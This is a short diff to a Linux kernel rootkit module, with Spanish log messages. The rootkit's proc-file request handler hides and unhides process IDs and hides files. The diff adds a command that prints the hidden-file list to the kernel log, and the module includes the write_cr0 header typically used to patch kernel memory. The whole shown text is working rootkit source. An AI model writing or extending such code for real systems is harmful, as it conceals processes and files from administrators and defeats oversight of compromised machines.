@@ -8,6 +8,7 @@
 #include <linux/delay.h>
 #include <linux/uaccess.h> // copy from user
 #include <linux/proc_fs.h>
+#include <linux/list.h>
 #include <asm/paravirt.h> // write_cr0
 
 #include "proc.h"
@@ -46,6 +47,14 @@ void handle_request(const char __user* buff, size_t len){
 			if (unhide_pid(pid) == -1)
 				printk(KERN_INFO "ROOTKIT: ERROR unhiding pid %d in proc\n", pid);
 			printk(KERN_INFO "ROOTKIT: petición desesconder pid %d terminada\n", pid);
+			break;
+		case 5: // PRINT HIDDEN
+			printk(KERN_INFO "ROOTKIT: Hidden files: ");
+			struct list_files_node* node;
+			list_for_each_entry(node, &list_files, list){
+				printk("%s, ", node->name);
+			}
+			printk("\n");
 			break;
 		default:
 			printk(KERN_INFO "ROOTKIT: ERROR Unknown peticion a proc\n");
